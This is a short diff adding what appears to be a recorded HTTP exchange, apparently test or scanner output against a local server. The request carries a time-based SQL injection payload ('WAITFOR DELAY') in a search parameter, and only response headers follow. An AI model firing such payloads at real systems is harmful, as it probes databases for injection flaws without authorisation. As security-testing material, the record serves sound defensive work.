@@ -1,0 +1,9 @@
+=== REQUEST ===
+GET http://127.0.0.1:61742/search?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
+
+=== RESPONSE ===
+HTTP/1.1 200 OK
+Date: Thu, 03 Apr 2025 19:54:35 GMT
+Content-Length: 25
+Content-Type: text/plain; charset=utf-8
+
